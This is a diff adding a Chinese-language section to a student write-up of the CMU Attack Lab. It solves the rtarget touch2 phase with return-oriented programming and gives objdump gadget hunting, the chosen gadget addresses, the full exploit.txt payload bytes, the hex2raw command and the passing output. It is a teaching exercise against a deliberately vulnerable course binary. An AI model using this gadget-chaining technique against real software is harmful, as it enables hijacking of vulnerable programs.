@@ -236,3 +236,69 @@ PASS: Would have posted the following:
         result  1:PASS:0xffffffff:ctarget:3:6A 00 48 BF 35 39 62 39 39 37 66 61 57 48 89 E7 68 FA 18 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 00 00 00 00
 ```
 
+## `rtarget`
+
+### 第四关
+
+先用 `objdump -d` 获得 `rtarget` 的编码：
+
+```shell
+$ objdump -d rtarget > rtarget.d
+```
+
+在 `start_farm` 与 `mid_farm` 之间（即 900~936 行，可存入 `half_farm.d` 以便检索），编码 `0xc3` 共出现 13 次 —— 可用指令只能取自这 13 处。
+
+`cookie` 的编码几乎不可能出现在 `half_farm.d` 内，故不能像[第二关](#第二关)那样用 `mov` 直接移入寄存器，而必须借 `getbuf()` 植入栈内，并借 `pop` 指令取出。因此，实现 `touch2(cookie)` 的最简单的方案为
+
+```gas
+# M[R[rsp]] = 0x59b997fa, which is my cookie
+popq %rdi # 5f (90)*
+# M[R[rsp]] = 0x4017ec, which is the address of touch2()
+retq      # c3
+```
+
+但 `5f (90)* c3` 并没有出现在 `half_farm.d` 内，故需借其他寄存器过渡：
+
+```gas
+popq %rax       # 58 (90)* c3
+movq %rax, %rdi # 48 89 c7 (90)* c3
+retq            # c3
+```
+
+在 `half_farm.d` 内检索得：
+
+- `58 90 c3` 在 `0x4019ab` 与 `0x4019cc` 各出现一次。
+- `48 89 c7 c3` 在 `0x4019a2` 出现一次，`48 89 c7 90 c3` 在 `0x4019c5` 出现一次。
+
+分别二选一，填入 `exploit.txt` 的适当位置：
+
+```c
+/* exploit.txt */
+/* buf[00, 08) */ 90 90 90 90 90 90 90 90
+/* buf[08, 16) */ 90 90 90 90 90 90 90 90
+/* buf[16, 24) */ 90 90 90 90 90 90 90 90
+/* buf[24, 32) */ 90 90 90 90 90 90 90 90
+/* buf[32, 40) */ 90 90 90 90 90 90 90 90
+/* buf[40, 48) */ ab 19 40 00 00 00 00 00 /* pop */
+/* buf[48, 56) */ fa 97 b9 59 00 00 00 00 /* cookie */
+/* buf[56, 64) */ a2 19 40 00 00 00 00 00 /* mov */
+/* buf[64, 72) */ ec 17 40 00 00 00 00 00 /* touch2 */
+```
+
+```shell
+$ cat exploit.txt | ./hex2raw | ./rtarget -q
+```
+
+最终得以下输出：
+
+```
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:2:90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
+```
+
